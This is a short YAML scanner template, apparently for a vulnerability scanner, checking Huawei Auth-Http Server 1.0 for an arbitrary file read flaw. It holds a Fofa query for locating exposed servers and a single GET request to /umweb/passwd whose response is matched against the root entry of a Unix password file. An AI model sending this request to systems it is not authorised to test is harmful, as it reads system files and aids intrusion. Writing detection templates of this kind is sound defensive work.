id: huawei-auth-http-fileread

info:
  name: 华为Auth-HTTP服务器任意文件读取漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    华为Auth-Http Server 1.0存在任意文件读取，攻击者可通过该漏洞读取任意文件。
    Fofa: server="Huawei Auth-Http Server 1.0"
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247498499&idx=1&sn=6850c3e9a3df795e48ba9a10c9772ddd
  tags: huawei,auth-http
  created: 2023/11/28

rules:
  r0:
    request:
      method: GET
      path: /umweb/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()